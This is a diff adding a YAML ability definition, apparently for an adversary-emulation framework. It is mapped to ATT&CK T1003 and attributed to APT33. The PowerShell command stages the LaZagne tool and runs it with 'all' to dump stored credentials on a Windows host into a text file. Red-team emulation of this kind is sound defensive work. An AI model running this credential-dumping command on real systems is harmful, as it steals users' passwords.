@@ -1,0 +1,38 @@
+- tactic: credential-access
+  technique_name: OS Credential Dumping
+  technique_id: T1003
+  name: Credential Dumping via Lazagne - APT33
+  description: Requires administrator privileges for best results
+  executors:
+  - name: psh
+    platform: windows
+    command: 'mv .\lazagne.exe #{host.dir.staged};
+
+      cd #{host.dir.staged};
+
+      .\lazagne.exe all | Out-File .\lazagne_results.txt;'
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - lazagne.exe
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.dir.staged
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 5dcb51ec-7799-4739-91c4-009de2f9abfb
